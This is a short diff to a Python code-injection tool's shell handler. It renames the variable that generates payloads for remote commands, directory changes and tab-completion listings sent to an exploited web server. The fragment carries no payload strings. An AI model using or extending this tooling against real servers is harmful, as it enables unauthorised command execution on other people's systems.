@@ -416,7 +416,7 @@ class codeinjector(baseClass):
                                         # Get Current Directory...
                                         commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), cmd, xml2config.getCurrentDirCode(isUnix))
                                         cmds = xml2config.concatCommands(commands, isUnix)
-                                        cmd = item.generatePayload(cmds)
+                                        cmd = working_shell.generatePayload(cmds)
                                         curdir = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix, headerDict=header_dict).strip()
                                         
                                         # Refresh Tab-Complete Cache...
@@ -424,7 +424,7 @@ class codeinjector(baseClass):
                                             self._log("Refreshing Tab-Completation cache...", self.LOG_DEBUG)
                                             commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), ls_cmd)
                                             cmds = xml2config.concatCommands(commands, isUnix)
-                                            cmd = item.generatePayload(cmds)
+                                            cmd = working_shell.generatePayload(cmds)
                                             tab_cache = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix, headerDict=header_dict).strip()
                                             if (ls_cmd != None):
                                                 dir_content = ",".join(tab_cache.split("\n"))
@@ -440,7 +440,7 @@ class codeinjector(baseClass):
                         print "See ya dude!"
                         print "Do not forget to close this security hole."
                     else:
-                        haxhelper = HaxHelper(self, url, postdata, mode, langClass, suffix, isUnix, sys_inject_works, item)
+                        haxhelper = HaxHelper(self, url, postdata, mode, langClass, suffix, isUnix, sys_inject_works, working_shell)
                         plugman.broadcast_callback(attack, haxhelper)
                         #ASDF
                 else:
@@ -451,7 +451,7 @@ class codeinjector(baseClass):
                     if (not attack.doInShell()):
                         shellcode = cpayload
                     else:
-                        shellcode = item.generatePayload(cpayload)
+                        shellcode = working_shell.generatePayload(cpayload)
 
 
                     code = self.__doHaxRequest(url, postdata, mode, shellcode, langClass, appendix, headerDict=header_dict)
